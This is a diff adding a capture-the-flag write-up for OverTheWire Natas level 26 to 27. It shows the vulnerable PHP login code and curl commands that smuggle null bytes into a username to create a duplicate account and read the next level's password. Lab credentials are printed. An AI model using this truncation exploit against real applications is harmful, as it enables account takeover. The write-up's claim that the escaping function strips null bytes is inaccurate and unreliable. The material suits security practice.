@@ -2055,6 +2055,163 @@ u3RRffXjysjgwFU6b9xa23i6prmUsYne
 ```
 
 # Level 26 -> 27:
+```
+abs@MacBookPro OverTheWire % curl "http://natas27.natas.labs.overthewire.org/index.php" -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne -s
+...
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+<?php
+
+// morla / 10111
+// database gets cleared every 5 min
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    if($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+} else {
+?>
+```
+
+Here's the thing: 
+
+We have 2 operations that are being done on the username when it creates it:
+- $usr != trim($usr)
+- $user=mysqli_real_escape_string($link, substr($usr, 0, 64))
+
+And one operation is done one when it try to compare it to existing usernames:
+- $user=mysqli_real_escape_string($link, $usr);
+
+We first want to trick it to think we entered new username, and from the other hand, we want that the
+new username it create will be "natas28", as it doesn't check for uniqeness, and will return the first find, which is the original creds.
+
+mysqli_real_escape_string() will remove any non string chars, like '\0'. So given: 'natas28\0\0\0vandelay', we will get 'natas28vandelay'.
+
+The key is that substr() we're doin in creation: We'll give a username like 'natas28' + 64*'\0' 'vandelay'.
+So where it first check if the username exists, it will be `natas28vandelay`, which shouldn't exist (hopefully).
+Then it'd procced creating a username, but it will first trim the input to: `natas28` + `\0\0...` only then it will apply the mysqli_real_escape_string() function and we'll be left with just `natas28`.
+
+So `natas28` will be created with my password, then in the next login, it'll find a entry in the db, and first the original (first) entry:
+```
+abs@MacBookPro natas % curl "http://natas27.natas.labs.overthewire.org/index.php" -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne -s --data-binary @<(python3 -c 'import sys; sys.stdout.buffer.write(b"username=natas28"+(b"\x00"*64)+b"art&password=vandelay")')
+```
+
+To the magic:
+```abs@MacBookPro natas % curl "http://natas27.natas.labs.overthewire.org/index.php" -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne -s -d "username=natas28" -d "password=vandelay"
+...
+<h1>natas27</h1>
+<div id="content">
+Welcome natas28!<br>Here is your data:<br>Array
+(
+    [username] =&gt; natas28
+    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+)
+```
+
 # Level 27 -> 28:
 # Level 28 -> 29:
 # Level 29 -> 30:
